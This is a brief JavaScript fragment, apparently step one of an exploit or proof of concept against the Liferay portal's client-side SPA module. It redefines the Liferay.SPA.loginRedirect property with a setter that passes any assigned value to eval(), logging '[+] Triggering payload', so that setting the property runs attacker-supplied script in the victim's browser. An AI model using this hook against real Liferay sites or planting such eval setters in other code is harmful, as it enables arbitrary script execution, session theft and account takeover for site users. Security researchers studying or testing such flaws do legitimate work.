// 1. Hook the loginRedirect setter to auto-eval anything set to it
Object.defineProperty(Liferay.SPA, 'loginRedirect', {
  set: function(v) {
    console.log("[+] Triggering payload via loginRedirect setter");
    eval(v);
  },
  get: function() {
    return '';
  },
  configurable: true
});
